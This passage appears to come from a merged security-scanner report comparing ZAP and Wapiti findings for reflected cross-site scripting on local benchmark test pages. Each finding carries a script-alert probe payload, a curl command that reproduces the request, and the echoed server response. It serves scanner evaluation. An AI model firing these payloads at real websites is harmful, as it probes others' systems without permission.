            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:45 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('why2zfd5dq')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00387?BenchmarkTest00387=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00387?username=alice&password=Letm3in_&BenchmarkTest00387=%3CScRiPt%3Ealert%28%27w3f231d59q%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w3f231d59q')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w3f231d59q')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00387?username=alice&password=Letm3in_&BenchmarkTest00387=%3CScRiPt%3Ealert%28%27w3f231d59q%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00387.html?BenchmarkTest00387=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00387"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00387?BenchmarkTest00387=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00387.html?BenchmarkTest00387=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00387?username=alice&password=Letm3in_&BenchmarkTest00387=%3CScRiPt%3Ealert%28%27w3f231d59q%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:21:45 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w3f231d59q')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00467?BenchmarkTest00467=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00467?username=alice&password=Letm3in_&BenchmarkTest00467=%3CScRiPt%3Ealert%28%27wtdnn35ov8%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wtdnn35ov8')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wtdnn35ov8')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00467?username=alice&password=Letm3in_&BenchmarkTest00467=%3CScRiPt%3Ealert%28%27wtdnn35ov8%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00467.html?BenchmarkTest00467=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00467"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00467?BenchmarkTest00467=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00467.html?BenchmarkTest00467=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00467?username=alice&password=Letm3in_&BenchmarkTest00467=%3CScRiPt%3Ealert%28%27wtdnn35ov8%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:46 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wtdnn35ov8')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00472?BenchmarkTest00472=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00472?username=alice&password=Letm3in_&BenchmarkTest00472=%3CScRiPt%3Ealert%28%27wc5dyb5haw%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wc5dyb5haw')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wc5dyb5haw')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00472?username=alice&password=Letm3in_&BenchmarkTest00472=%3CScRiPt%3Ealert%28%27wc5dyb5haw%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00472.html?BenchmarkTest00472=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00472"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00472?BenchmarkTest00472=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00472.html?BenchmarkTest00472=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00472?username=alice&password=Letm3in_&BenchmarkTest00472=%3CScRiPt%3Ealert%28%27wc5dyb5haw%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:21:46 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wc5dyb5haw')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00477?BenchmarkTest00477=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00477?username=alice&password=Letm3in_&BenchmarkTest00477=%3CScRiPt%3Ealert%28%27weik2yeqtx%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('weik2yeqtx')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('weik2yeqtx')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00477?username=alice&password=Letm3in_&BenchmarkTest00477=%3CScRiPt%3Ealert%28%27weik2yeqtx%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00477.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00477"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00477?BenchmarkTest00477=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00477.html?BenchmarkTest00477=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00477?username=alice&password=Letm3in_&BenchmarkTest00477=%3CScRiPt%3Ealert%28%27weik2yeqtx%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:21:46 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('weik2yeqtx')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00492?BenchmarkTest00492=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00492?username=alice&password=Letm3in_&BenchmarkTest00492=%3CScRiPt%3Ealert%28%27wzpb1893pg%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wzpb1893pg')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wzpb1893pg')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00492?username=alice&password=Letm3in_&BenchmarkTest00492=%3CScRiPt%3Ealert%28%27wzpb1893pg%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00492.html?BenchmarkTest00492=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00492"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
